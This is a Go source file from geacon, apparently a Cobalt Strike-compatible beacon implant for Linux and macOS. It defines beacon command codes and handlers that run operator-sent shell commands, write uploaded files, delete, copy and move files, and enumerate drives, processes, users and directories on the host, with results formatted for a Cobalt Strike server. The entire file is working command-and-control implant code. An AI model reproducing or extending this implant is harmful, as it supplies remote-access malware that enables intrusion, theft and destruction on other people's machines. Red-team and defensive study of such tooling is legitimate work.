package packet

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"geacon/cmd/util"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/process"
)

const (
	CMD_TYPE_SLEEP        = 4		// IMPLEMENTED 
	CMD_TYPE_DATA_JITTER  = 6		// TODO
	CMD_TYPE_CHECKIN	  = 8		// WONTFIX: only required for DNS beacons
	CMD_TYPE_SHELL        = 78		// IMPLEMENTED
	CMD_TYPE_UPLOAD_START = 10		// IMPLEMENTED
	CMD_TYPE_UPLOAD_LOOP  = 67		// IMPLEMENTED
	CMD_TYPE_DOWNLOAD     = 11		// IMPLEMENTED
	CMD_TYPE_EXIT         = 3		// IMPLEMENTED
	CMD_TYPE_CD           = 5		// IMPLEMENTED
	CMD_TYPE_PWD          = 39		// IMPLEMENTED
	CMD_TYPE_FILE_BROWSE  = 53		// IMPLEMENTED
	CMD_TYPE_RM			  = 56		// IMPLEMENTED
	CMD_TYPE_LIST_PROCESS = 32		// TODO
	CMD_TYPE_GETUID		  = 27		// IMPLEMENTED
	CMD_TYPE_CP			  = 73		// IMPLEMENTED
	CMD_TYPE_MV			  = 74		// IMPLEMENTED
	CMD_TYPE_IP_CONFIG	  = 48		// TODO
	CMD_TYPE_DRIVES		  = 55		// IMPLEMENTED

	BEACON_RSP_OUTPUT_KEYSTROKES	    = 1
	BEACON_RSP_DOWNLOAD_START	        = 2
	BEACON_RSP_OUTPUT_SCREENSHOT	    = 3
	BEACON_RSP_SOCKS_DIE	            = 4
	BEACON_RSP_SOCKS_WRITE	            = 5
	BEACON_RSP_SOCKS_RESUME	        	= 6
	BEACON_RSP_SOCKS_PORTFWD	        = 7
	BEACON_RSP_DOWNLOAD_WRITE	        = 8
	BEACON_RSP_DOWNLOAD_COMPLETE	    = 9
	BEACON_RSP_BEACON_LINK	            = 10
	BEACON_RSP_DEAD_PIPE	            = 11
	BEACON_RSP_BEACON_CHECKIN	        = 12
	BEACON_RSP_BEACON_ERROR	        	= 13
	BEACON_RSP_PIPES_REGISTER	        = 14
	BEACON_RSP_BEACON_IMPERSONATED	    = 15
	BEACON_RSP_BEACON_GETUID	        = 16
	BEACON_RSP_BEACON_OUTPUT_PS	    	= 17
	BEACON_RSP_ERROR_CLOCK_SKEW	    	= 18
	BEACON_RSP_BEACON_GETCWD	        = 19
	BEACON_RSP_BEACON_OUTPUT_JOBS	    = 20
	BEACON_RSP_BEACON_OUTPUT_HASHES		= 21
	BEACON_RSP_FILE_BROWSE_RESULT      	= 22
	BEACON_RSP_SOCKS_ACCEPT	        	= 23
	BEACON_RSP_BEACON_OUTPUT_NET	    = 24
	BEACON_RSP_BEACON_OUTPUT_PORTSCAN	= 25
	BEACON_RSP_BEACON_EXIT	            = 26
	BEACON_RSP_OUTPUT	                = 30
)

func ParseCommandShell(b []byte) (string, []byte) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		panic(err)
	}
	pathLen := ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		panic(err)
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		panic(err)
	}

	cmdLen := ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd
}

func Shell(path string, args []byte) []byte {
	switch runtime.GOOS {
	case "windows":
		args = bytes.Trim(args, " ")
		argsArray := strings.Split(string(args), " ")
		cmd := exec.Command(path, argsArray...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Sprintf("exec failed with %s\n", err)
		}
		return out
	case "darwin":
		path = "/bin/bash"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	case "linux":
		path = "/bin/sh"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	}
	args = bytes.Trim(args, " ")
	startPos := bytes.Index(args, []byte("-c"))
	args = args[startPos+3:]
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Sprintf("exec failed with %s\n", err)
	}
	return out

}

func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}

func Upload(filePath string, fileContent []byte) int {
	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		//fmt.Printf("file create err : %v\n", err)
		return 0
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		//fmt.Printf("file write err : %v\n", err)
		return 0
	}
	//fmt.Printf("the offset is %d\n",offset)
	return offset
}
func ChangeCurrentDir(path []byte) {
	err := os.Chdir(string(path))
	if err != nil {
		//processError(err.Error())
		processErrorTest(err.Error())
	}
}
func GetCurrentDirectory() []byte {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		processErrorTest(err.Error())
		return nil
	}
	return []byte(result)
}

func RemoveFile(path []byte) {
	err := os.Remove(string(path))
	if err != nil {
		processErrorTest(err.Error())
	}
}

func ListDrives() []byte {
	partitions, err := disk.Partitions(true)
	if err != nil {
		processErrorTest(err.Error())
		return nil
	}

	var sb strings.Builder

	for _, partition := range partitions {
		sb.WriteString(fmt.Sprintf("%s\n", partition.Mountpoint))
	}

	return []byte(sb.String())
}

func GetUid() []byte {
	userDetails, err := user.Current()
	if err != nil {
		processErrorTest(err.Error())
		return nil
	}
	result := fmt.Sprintf("%s (uid=%s, gid=%s)\n", userDetails.Username, userDetails.Uid, userDetails.Gid)
	return []byte(result)
}

func ParseCommandCopyMove(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	fromPathLenBytes := make([]byte, 4)
	_, err := buf.Read(fromPathLenBytes)
	if err != nil {
		panic(err)
	}
	fromPathLen := ReadInt(fromPathLenBytes)
	fromPath := make([]byte, fromPathLen)
	_, err = buf.Read(fromPath)
	if err != nil {
		panic(err)
	}

	toPathLenBytes := make([]byte, 4)
	_, err = buf.Read(toPathLenBytes)
	if err != nil {
		panic(err)
	}

	toPathLen := ReadInt(toPathLenBytes)
	toPath := make([]byte, toPathLen)
	buf.Read(toPath)

	return fromPath, toPath
}

func CopyFile(fromPath, toPath []byte) {
	in, err := os.Open(string(fromPath))
    if err != nil {
        fmt.Printf("File Open error: %s\n", err)
    }
    defer in.Close()

    out, err := os.Create(string(toPath))
    if err != nil {
        fmt.Printf("File Open error: %s\n", err)
    }
    defer out.Close()

    _, err = io.Copy(out, in)
    if err != nil {
        fmt.Printf("File Copy error: %s\n", err)
    }
}

func MoveFile(oldLocation, newLocation []byte) {
	err := os.Rename(string(oldLocation), string(newLocation))
	if err != nil {
		fmt.Printf("File Move error: %s\n", err)
	}
}

func ListProcesses() []byte {
	processList, err := process.Processes()
	if err != nil {
		fmt.Printf("File Move error: %s\n", err)
		return nil
	}

	var sb strings.Builder

	for _, processEntity := range processList {
		parent, err := processEntity.Ppid()
		if err != nil {
			fmt.Printf("Error getting process parent: %s\n", err)
		} 
		name, err := processEntity.Name()
		if err != nil {
			fmt.Printf("Error getting process name: %s\n", err)
		} 
		username, err := processEntity.Username()
		if err != nil {
			fmt.Printf("Error getting process user: %s\n", err)
		} 
		// for whatever reason, Cobalt Strike expects the output in the format
		// PPID <TAB> PID <TAB> Name <TAB> Arch <TAB> Session <TAB> User
		//
		// As arch and session are not really a thing in UNIX, we just leave these fields blank
		sb.WriteString(fmt.Sprintf("%s\t%d\t%d\t\t%s\n", name, parent, processEntity.Pid, username))
	}

	return []byte(sb.String())
}

func File_Browse(b []byte) []byte {
	buf := bytes.NewBuffer(b)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	dirPathLenBytes := make([]byte, 4)

	_, err := buf.Read(pendingRequest)
	if err != nil {
		panic(err)
	}
	_, err = buf.Read(dirPathLenBytes)
	if err != nil {
		panic(err)
	}

	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		panic(err)
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     cmd
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     packet
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		processErrorTest(err.Error())
		return nil
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		panic(err)
	}
	modTimeStr := modTime.Format("02/01/2006 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	//resultStr := fmt.Sprintf("%s/*", absCurrentDir)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := ioutil.ReadDir(dirPathStr)
	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		if file.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
		}
	}
	//fmt.Println(resultStr)

	return util.BytesCombine(pendingRequest, []byte(resultStr))

}

func processErrorTest(err string) {
	errIdBytes := WriteInt(0) // must be zero
	arg1Bytes := WriteInt(0)  // for debug
	arg2Bytes := WriteInt(0)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	finalPaket := MakePacket(31, result)
	PushResult(finalPaket)
}
func Download() {

}
